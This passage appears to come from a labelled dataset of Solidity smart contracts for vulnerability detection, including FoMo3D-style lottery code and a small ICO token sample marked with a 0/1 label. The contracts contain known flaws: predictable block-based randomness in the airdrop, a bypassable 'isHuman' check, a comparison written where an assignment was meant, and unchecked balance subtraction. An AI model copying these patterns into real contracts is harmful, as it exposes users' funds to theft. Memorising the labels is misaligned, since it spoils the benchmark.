|| _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxName_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {                 uint256 _rID = rID_;                         uint256 _now = now;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _eth;                         if (_now > round_[_rID].end && round_[_rID].ended == false)        {                         F3Ddatasets.EventReturns memory _eventData_;                         			round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);            			             _eth = withdrawEarnings(_pID);                                     if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                     emit F3Devents.onWithdrawAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eth,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.P3DAmount,                 _eventData_.genAmount            );                             } else {                         _eth = withdrawEarnings(_pID);                                     if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                                     emit F3Devents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }             function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }        function registerNameXaddr(string _nameString, address _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }        function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);                uint256 _pID = pIDxAddr_[_addr];                         emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }             function getBuyPrice()        public         view         returns(uint256)    {                   uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 75000000000000 );      }             function getTimeLeft()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                         uint256 _now = now;                if (_now < round_[_rID].end)            if (_now < round_[_rID].strt + rndGap_)                return( (round_[_rID].strt + rndGap_).sub(_now));            else                 return( (round_[_rID].end).sub(_now) );        else            return(0);    }             function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                         if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         if (round_[_rID].plyr == _pID)            {                return                (                    (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                    plyr_[_pID].aff                );                         } else {                return                (                    plyr_[_pID].win,                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                    plyr_[_pID].aff                );            }                             } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff            );        }    }             function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)        private        view        returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }             function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;                return        (            round_[_rID].ico,                            _rID,                                        round_[_rID].keys,                           round_[_rID].end,                            round_[_rID].strt,                           round_[_rID].pot,                            (round_[_rID].team + (round_[_rID].plyr * 10)),                  plyr_[round_[_rID].plyr].addr,               plyr_[round_[_rID].plyr].name,               rndTmEth_[_rID][0],                          rndTmEth_[_rID][1],                          rndTmEth_[_rID][2],                          rndTmEth_[_rID][3],                          airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)        public         view         returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;                if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];                return        (            _pID,                                            plyr_[_pID].name,                                plyrRnds_[_pID][_rID].keys,                      plyr_[_pID].win,                                 (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                    plyr_[_pID].aff,                                 plyrRnds_[_pID][_rID].eth                    );    }             function buyCore(uint256 _pID, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))         {                         core(_rID, _pID, msg.value, _affID, _team, _eventData_);                         } else {                         if (_now > round_[_rID].end && round_[_rID].ended == false)             {                 			    round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                                 emit F3Devents.onBuyAndDistribute                (                    msg.sender,                     plyr_[_pID].name,                     msg.value,                     _eventData_.compressedData,                     _eventData_.compressedIDs,                     _eventData_.winnerAddr,                     _eventData_.winnerName,                     _eventData_.amountWon,                     _eventData_.newPot,                     _eventData_.P3DAmount,                     _eventData_.genAmount                );            }                                     plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }             function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))         {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                                     core(_rID, _pID, _eth, _affID, _team, _eventData_);                         } else if (_now > round_[_rID].end && round_[_rID].ended == false) {                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                         emit F3Devents.onReLoadAndDistribute            (                msg.sender,                 plyr_[_pID].name,                 _eventData_.compressedData,                 _eventData_.compressedIDs,                 _eventData_.winnerAddr,                 _eventData_.winnerName,                 _eventData_.amountWon,                 _eventData_.newPot,                 _eventData_.P3DAmount,                 _eventData_.genAmount            );        }    }             function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                         if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)        {            uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);            uint256 _refund = _eth.sub(_availableLimit);            plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);            _eth = _availableLimit;        }                         if (_eth > 1000000000)         {                                     uint256 _keys = (round_[_rID].eth).keysRec(_eth);                                     if (_keys >= 1000000000000000000)            {            updateTimer(_keys, _rID);                         if (round_[_rID].plyr != _pID)                round_[_rID].plyr = _pID;              if (round_[_rID].team != _team)                round_[_rID].team = _team;                                      _eventData_.compressedData = _eventData_.compressedData + 100;        }                                     if (_eth >= 100000000000000000)            {            airDropTracker_++;            if (airdrop() == true)            {                                 uint256 _prize;                if (_eth >= 10000000000000000000)                {                                         _prize = ((airDropPot_).mul(75)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 300000000000000000000000000000000;                } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                         _prize = ((airDropPot_).mul(50)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 200000000000000000000000000000000;                } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                         _prize = ((airDropPot_).mul(25)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                                             airDropPot_ = (airDropPot_).sub(_prize);                                                             _eventData_.compressedData += 300000000000000000000000000000000;                }                                 _eventData_.compressedData += 10000000000000000000000000000000;                                 _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                                 airDropTracker_ = 0;            }        }                             _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                                     plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);                                     round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);            rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                             _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);                         		    endTx(_pID, _team, _eth, _keys, _eventData_);        }    }             function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    {        return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );    }             function calcKeysReceived(uint256 _rID, uint256 _eth)        public        view        returns(uint256)    {                 uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && _now <= round_[_rID].end)            return ( (round_[_rID].eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }             function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {                 uint256 _rID = rID_;                         uint256 _now = now;                         if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }             function receivePlayerNameList(uint256 _pID, bytes32 _name)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }                    function determinePID(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = PlayerBook.getPlayerID(msg.sender);            bytes32 _name = PlayerBook.getPlayerName(_pID);            uint256 _laff = PlayerBook.getPlayerLAff(_pID);                                     pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;                        if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }                        if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                                     _eventData_.compressedData = _eventData_.compressedData + 1;        }         return (_eventData_);    }             function verifyTeam(uint256 _team)        private        pure        returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }             function managePlayer(uint256 _pID, F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                          if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                             plyr_[_pID].lrnd = rID_;                             _eventData_.compressedData = _eventData_.compressedData + 10;                return(_eventData_);    }             function endRound(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                 uint256 _rID = rID_;                         uint256 _winPID = round_[_rID].plyr;        uint256 _winTID = round_[_rID].team;                         uint256 _pot = round_[_rID].pot;                                  uint256 _win = (_pot.mul(48)) / 100;        uint256 _com = (_pot / 50);        uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;        uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;        uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);                         uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                         plyr_[_winPID].win = _win.add(plyr_[_winPID].win);                         Jekyll_Island_Inc.deposit.value(_com)();                         round_[_rID].mask = _ppt.add(round_[_rID].mask);                         if (_p3d > 0)            Divies.deposit.value(_p3d)();                             _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.P3DAmount = _p3d;        _eventData_.newPot = _res;                         rID_++;        _rID++;        round_[_rID].strt = now;        round_[_rID].end = now.add(rndInit_).add(rndGap_);        round_[_rID].pot = _res;                return(_eventData_);    }             function updateGenVault(uint256 _pID, uint256 _rIDlast)        private     {        uint256 _earnings = calcUnMaskedEarnings(_pID, _rIDlast);        if (_earnings > 0)        {                         plyr_[_pID].gen = _earnings.add(plyr_[_pID].gen);                         plyrRnds_[_pID][_rIDlast].mask = _earnings.add(plyrRnds_[_pID][_rIDlast].mask);        }    }             function updateTimer(uint256 _keys, uint256 _rID)        private    {                 uint256 _now = now;                         uint256 _newTime;        if (_now > round_[_rID].end && round_[_rID].plyr == 0)            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(_now);        else            _newTime = (((_keys) / (1000000000000000000)).mul(rndInc_)).add(round_[_rID].end);                         if (_newTime < (rndMax_).add(_now))            round_[_rID].end = _newTime;        else            round_[_rID].end = rndMax_.add(_now);    }             function airdrop()        private         view         returns(bool)    {        uint256 seed = uint256(keccak256(abi.encodePacked(                        (block.timestamp).add            (block.difficulty).add            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add            (block.gaslimit).add            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add            (block.number)                    )));        if((seed - ((seed / 1000) * 1000)) < airDropTracker_)            return(true);        else            return(false);    }         function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _com = _eth / 50;        Jekyll_Island_Inc.deposit.value(_com)();                         uint256 _long = _eth / 100;        otherF3D_.potSwap.value(_long)();                         uint256 _aff = _eth / 10;        uint256 _p3d;                                  if (_affID != _pID && plyr_[_affID].name != '') {            plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);            emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);        } else {            _p3d = _aff;        }                         _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));        if (_p3d > 0)        {                         Divies.deposit.value(_p3d)();                                     _eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);        }                return(_eventData_);    }        function potSwap()        isActivated()        external        payable    {                 uint256 _rID = rID_;                if (now > round_[_rID].end && round_[_rID].ended == true)        {            round_[_rID + 1].pot = round_[_rID + 1].pot.add(msg.value);            emit F3Devents.onPotSwapDeposit(_rID + 1, msg.value);        } else {            round_[_rID].pot = round_[_rID].pot.add(msg.value);            emit F3Devents.onPotSwapDeposit(_rID, msg.value);        }    }             function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                         uint256 _air = (_eth / 100);        airDropPot_ = airDropPot_.add(_air);                         _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));                         uint256 _pot = _eth.sub(_gen);                                  uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                         round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                         _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;                return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {                                  uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                                      uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                         return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }             function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                         uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }             function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);                emit F3Devents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.P3DAmount,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }             bool public activated_ = false;    function activate()        public    {                 require(            msg.sender == 0x18E90Fc6F70344f53EBd4f6070bf6Aa23e2D748C ||            msg.sender == 0x8b4DA1827932D71759687f925D17F81Fc94e3A9D ||            msg.sender == 0x8e0d985f3Ec1857BEc39B76aAabDEa6B31B67d53 ||            msg.sender == 0x7ac74Fcc1a71b106F12c55ee8F802C9F672Ce40C ||			msg.sender == 0xF39e044e1AB204460e06E87c6dca2c6319fC69E3,            "only team just can activate"        );		         require(address(otherF3D_) != address(0), "must link to other FoMo3D first");                         require(activated_ == false, "fomo3d already activated");                         activated_ = true;                 		rID_ = 1;        round_[1].strt = now + rndExtra_ - rndGap_;        round_[1].end = now + rndInit_ + rndExtra_;    }    function setOtherFomo(address _otherF3D)        public    {                 require(            msg.sender == 0x18E90Fc6F70344f53EBd4f6070bf6Aa23e2D748C ||            msg.sender == 0x8b4DA1827932D71759687f925D17F81Fc94e3A9D ||            msg.sender == 0x8e0d985f3Ec1857BEc39B76aAabDEa6B31B67d53 ||            msg.sender == 0x7ac74Fcc1a71b106F12c55ee8F802C9F672Ce40C ||			msg.sender == 0xF39e044e1AB204460e06E87c6dca2c6319fC69E3,            "only team just can activate"        );                 require(address(otherF3D_) == address(0), "silly dev, you already did that");                         otherF3D_ = otherFoMo3D(_otherF3D);    }}    library F3Ddatasets {                                                                                                                                                               struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 P3DAmount;                   uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256 plyr;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;             uint256 p3d;         }    struct PotSplit {        uint256 gen;             uint256 p3d;         }}    library F3DKeysCalcLong {    using SafeMath for *;             function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }             function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)         internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);    }             function eth(uint256 _keys)         internal        pure        returns(uint256)      {        return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}    interface otherFoMo3D {    function potSwap() external payable;}interface F3DexternalSettingsInterface {    function getFastGap() external returns(uint256);    function getLongGap() external returns(uint256);    function getFastExtra() external returns(uint256);    function getLongExtra() external returns(uint256);}interface DiviesInterface {    function deposit() external payable;}interface JIincForwarderInterface {    function deposit() external payable returns(bool);    function status() external view returns(address, address, bool);    function startMigration(address _newCorpBank) external returns(bool);    function cancelMigration() external returns(bool);    function finishMigration() external returns(bool);    function setup(address _firstCorpBank) external;}interface PlayerBookInterface {    function getPlayerID(address _addr) external returns (uint256);    function getPlayerName(uint256 _pID) external view returns (bytes32);    function getPlayerLAff(uint256 _pID) external view returns (uint256);    function getPlayerAddr(uint256 _pID) external view returns (address);    function getNameFee() external view returns (uint256);    function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);} library NameFilter {             function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                         require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                         bool _hasNonNumber;                         for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                         _temp[i] == 0x20 ||                                          (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                         (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;                }        }                require(_hasNonNumber == true, "string cannot be only numbers");                bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }} library SafeMath {             function mul(uint256 a, uint256 b)         internal         pure         returns (uint256 c)     {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)     {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)     {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }             function sqrt(uint256 x)        internal        pure        returns (uint256 y)     {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)         {            y = z;            z = ((add((x / z),z)) / 2);        }    }             function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }             function pwr(uint256 x, uint256 y)        internal         pure         returns (uint256)    {        if (x==0)            return (0);        else if (y==0)            return (1);        else         {            uint256 z = x;            for (uint256 i=1; i < y; i++)                z = mul(z,x);            return (z);        }    }}
1<CODESPLIT>contract BaseICOTokenWithBonus {    uint public bonusUnlockAt;    mapping(address => uint) public balances;    mapping(address => uint) public bonusBalances;    function getAllowedForTransferTokens(address from_) public view returns (uint) {        return (bonusUnlockAt >= block.timestamp) ? balances[from_] - (bonusBalances[from_]) : balances[from_];    }}
0<CODESPLIT>contract LBevents {         event onNewName    (        uint256 indexed playerID,        address indexed playerAddress,        bytes32 indexed playerName,        bool isNewPlayer,        uint256 affiliateID,        address affiliateAddress,        bytes32 affiliateName,        uint256 amountPaid,        uint256 timeStamp    );             event onEndTx    (        uint256 compressedData,             uint256 compressedIDs,              bytes32 playerName,        address playerAddress,        uint256 ethIn,        uint256 keysBought,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 P3DAmount,        uint256 genAmount,        uint256 potAmount,        uint256 airDropPot    );    	     event onWithdraw    (        uint256 indexed playerID,        address playerAddress,        bytes32 playerName,        uint256 ethOut,        uint256 timeStamp    );             event onWithdrawAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 ethOut,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 P3DAmount,        uint256 genAmount    );                  event onBuyAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 ethIn,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 P3DAmount,        uint256 genAmount    );                  event onReLoadAndDistribute    (        address playerAddress,        bytes32 playerName,        uint256 compressedData,        uint256 compressedIDs,        address winnerAddr,        bytes32 winnerName,        uint256 amountWon,        uint256 newPot,        uint256 P3DAmount,        uint256 genAmount    );             event onAffiliatePayout    (        uint256 indexed affiliateID,        address affiliateAddress,        bytes32 affiliateName,        uint256 indexed roundID,        uint256 indexed buyerID,        uint256 amount,        uint256 timeStamp    );             event onPotSwapDeposit    (        uint256 roundID,        uint256 amountAddedToPot    );}    
0<CODESPLIT>contract LB is modularShort {    using SafeMath for *;    using NameFilter for string;    using LBKeysCalcLong for uint256;	    address community_addr = 0x3661647405Af4cf29a4843722dC103e5D81C7949;	PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x392063fCb96E78Eb4b51d8faee3F5e1792959F67);        string constant public name = "LB";    string constant public symbol = "LB";    uint256 private rndExtra_ = 0;          uint256 private rndGap_ = 0;              uint256 constant private rndInit_ = 30 minutes;                     uint256 constant private rndInc_ = 30 seconds;                   uint256 constant private rndMax_ = 24 hours;                     	uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;            mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => LBdatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => LBdatasets.PlayerRounds)) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;         mapping (uint256 => LBdatasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;              mapping (uint256 => LBdatasets.TeamFee) public fees_;               mapping (uint256 => LBdatasets.PotSplit) public potSplit_;              constructor()        public    {		                                     		                               fees_[0] = LBdatasets.TeamFee(30,0);            fees_[1] = LBdatasets.TeamFee(43,0);            fees_[2] = LBdatasets.TeamFee(56,0);           fees_[3] = LBdatasets.TeamFee(43,8);                                      potSplit_[0] = LBdatasets.PotSplit(15,0);           potSplit_[1] = LBdatasets.PotSplit(20,0);            potSplit_[2] = LBdatasets.PotSplit(25,0);           potSplit_[3] = LBdatasets.PotSplit(30,0);   	}             modifier isActivated() {        require(activated_ == true, "its not ready yet.  ");         _;    }             modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;                assembly 